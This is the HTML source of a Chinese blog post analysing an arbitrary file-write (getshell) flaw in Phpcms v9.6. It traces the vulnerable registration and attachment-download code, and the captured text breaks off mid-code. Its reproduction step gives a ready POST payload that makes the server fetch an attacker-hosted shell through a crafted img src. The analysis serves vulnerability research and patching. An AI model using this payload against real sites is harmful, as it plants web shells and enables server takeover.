@@ -1,0 +1,1160 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Lucifaer">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Lucifaer">
+    <meta name="keywords" content="Lucifaer's blog | Lucifaer">
+    <meta name="description" content="Some Lucifaer's security researchers and security analysis">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Phpcms V9.6.0任意文件写入getshell · Lucifaer&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}')
+
+            var algolia = {
+                applicationID: 'K0XKT0INON',
+                apiKey: 'cc8e96eb9aa249bbd7662f7f8f7d70ca',
+                indexName: 'blog',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Lucifaer&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Phpcms V9.6.0任意文件写入getshell</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Lucifaer's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Phpcms V9.6.0任意文件写入getshell
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PHP">PHP</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,143</span> / Reading time: <span class="post-count">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2017/04/13</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>上周phpcms v9.6的任意文件上传的漏洞，已经潜伏半年多的一个漏洞。该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。</p>
+<h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><p>phpcms v9.6</p>
+<a id="more"></a>
+<h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>正常部署phpcms v9.6就好。</p>
+<p>复现过程中，可以在用户注册页面通过POST提交：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://127.0.0.1/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
+<p>在<code>src</code>后面跟上自己shell的url。注意是要<code>.txt</code>格式写的shell。</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>网上已经有逆向分析的过程，这次我来正向的分析一下这个洞。</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="1-文件上传部分"><a href="#1-文件上传部分" class="headerlink" title="1. 文件上传部分"></a>1. 文件上传部分</h3><p>首先看到用户注册的模块，位于<code>phpcms/modules/member/index.php</code>的<code>register</code>方法中。</p>
+<p>代码很多，一点点往下看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_session_start();</span><br><span class="line">		<span class="comment">//获取用户siteid</span></span><br><span class="line">		$siteid = <span class="keyword">isset</span>($_REQUEST[<span class="string">'siteid'</span>]) &amp;&amp; trim($_REQUEST[<span class="string">'siteid'</span>]) ? intval($_REQUEST[<span class="string">'siteid'</span>]) : <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//定义站点id常量</span></span><br><span class="line">		<span class="keyword">if</span> (!defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">		   define(<span class="string">'SITEID'</span>, $siteid);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//加载用户模块配置</span></span><br><span class="line">		$member_setting = getcache(<span class="string">'member_setting'</span>);</span><br><span class="line">		<span class="keyword">if</span>(!$member_setting[<span class="string">'allowregister'</span>]) &#123;</span><br><span class="line">			showmessage(L(<span class="string">'deny_register'</span>), <span class="string">'index.php?m=member&amp;c=index&amp;a=login'</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>完成了对<code>siteid</code>的定义与注册功能是否开启的检验。注意到了<code>$member_setting = getcache(&#39;member_setting&#39;);</code>跟到<code>phpcms/caches_member/member_setting.cache.php</code>，看一下有关会员注册的设置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'allowregister'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'choosemodel'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'enablemailcheck'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'registerverify'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'showapppoint'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'rmb_point_rate'</span> =&gt; <span class="string">'10'</span>,</span><br><span class="line">  <span class="string">'defualtpoint'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'defualtamount'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'showregprotocol'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'regprotocol'</span> =&gt; <span class="string">'省略等等信息'</span></span><br></pre></td></tr></table></figure>
+<p>接下来就是对于post传过来的参数的获取，可以快速跟到130行，看到有我们可控的地方：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">				<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">		        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">				$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</span><br><span class="line">				$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">				$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+<p>首先，对于<code>modelid</code>是可控的，也就是说<code>member_input</code>的模块调用是可控的。</p>
+<p>其次，就是将我们<code>$_POST[&#39;info&#39;]</code>的参数进行html实体编码，之后调用<code>member_input</code>中的<code>get</code>方法。跟一下，在<code>phpcms/caches/caches_model/caches_data/member_input.class.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">		$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">		$info = <span class="keyword">array</span>();</span><br><span class="line">		$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line">		<span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line">				<span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">				$field = safe_replace($field);</span><br><span class="line">				$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">				$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">				$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">				$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">				$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">				$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line">				<span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line">				<span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line">				<span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">					showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					str_cut($value, $maxlength);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">	            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">				$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line">				<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line">	</span><br><span class="line">				$info[$field] = $value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $info;</span><br></pre></td></tr></table></figure>
+<p>看到<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>，这里的<code>$this-&gt;fields</code>可以在构造函数中找到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;fields = getcache(<span class="string">'model_field_'</span>.$modelid,<span class="string">'model'</span>);</span><br></pre></td></tr></table></figure>
+<p>可控，默认的<code>$modelid</code>是1，跟着看一下<code>phpcms/caches/caches_model/caches_data/member_input.class.php</code>，看一下<code>formtype</code>的值，大致有下面这么多种：</p>
+<ul>
+<li>catid</li>
+<li>typeid</li>
+<li>title</li>
+<li>keyword</li>
+<li>copyfrom</li>
+<li>textarea</li>
+<li>datetime</li>
+<li>editor</li>
+<li>image</li>
+<li>omipotent</li>
+<li>pages</li>
+<li>posid</li>
+<li>groupid</li>
+<li>islink</li>
+<li>text</li>
+<li>number</li>
+<li>template</li>
+<li>box</li>
+<li>readpoint</li>
+</ul>
+<p>同时对比<code>member_input.class.php</code>中的方法，只有：</p>
+<ul>
+<li>textarea</li>
+<li>editor</li>
+<li>box</li>
+<li>images</li>
+<li>datetime</li>
+</ul>
+<p>看一下每一个方法，其中与文件操作有关的，只有editor方法，记一下<code>formtype=editor</code>的field的名字<code>content</code>。</p>
+<p>现在着重来看一下editor方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">		$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">		$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">		$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">		$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">		$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">		<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>关键在于<code>$value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);</code></p>
+<p>跟踪<code>$this-&gt;attachment-&gt;download</code>，回看构造函数，也就是跟踪<code>phpcms/libs/classes/attachment.class.php</code>中的<code>download</code>方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $image_d;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">	$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">	$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">	$uploadpath = $upload_url.$dir;</span><br><span class="line">	$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">	$string = new_stripslashes($value);</span><br><span class="line">	<span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">	$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		dir_create($uploaddir);</span><br><span class="line">		$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>($matches, $string);</span><br><span class="line">	$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">	$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		$filename = fileext($file);</span><br><span class="line">		$file_name = basename($file);</span><br><span class="line">		$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">		$newfile = $uploaddir.$filename;</span><br><span class="line">		$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">		<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">			$oldpath[] = $k;</span><br><span class="line">			$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">			@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">			$fileext = fileext($filename);</span><br><span class="line">			<span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">				watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">			&#125;</span><br><span class="line">			$filepath = $dir.$filename;</span><br><span class="line">			$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">			$aid = <span 